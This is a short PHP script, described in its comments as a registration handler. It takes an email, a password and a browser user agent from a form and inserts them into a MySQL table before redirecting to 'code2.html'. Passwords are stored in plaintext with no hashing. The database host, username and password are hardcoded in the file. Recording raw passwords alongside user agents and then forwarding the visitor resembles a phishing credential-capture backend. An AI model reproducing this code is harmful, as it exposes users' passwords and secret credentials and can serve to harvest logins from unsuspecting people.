<?php
// Get user input
$email = filter_var($_POST["email"], FILTER_SANITIZE_EMAIL); // Using 'email' to match form input name
$password = $_POST["password"]; // Using 'password' to match form input name
$userAgent = $_POST["userAgent"]; // Get user agent from form

// Validate email
if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
    die("Invalid email format");
}

// Validate password (example: ensure not empty)
if (empty($password)) {
    die("Password cannot be empty");
}

// Database connection
$conn = new mysqli("sql202.infinityfree.com", "if0_37694885", "0YN3dToFeBfy4", "if0_37694885_erosdatabase1");

// Check connection
if ($conn->connect_error) {
    error_log("Database connection failed: " . $conn->connect_error);
    die("Connection failed, please try again later.");
}

// Prepare and bind
$stmt = $conn->prepare("INSERT INTO ananda (email, password, user_agent) VALUES (?, ?, ?)");
$stmt->bind_param("sss", $email, $password, $userAgent);

// Execute and handle success or error
if ($stmt->execute()) {
    header("Location: code2.html"); // Redirect to the desired page after successful registration
    exit();
} else {
    error_log("Database error: " . $stmt->error);
    echo "An error occurred during registration. Please try again.";
}

// Close the statement and connection
$stmt->close();
$conn->close();
?>
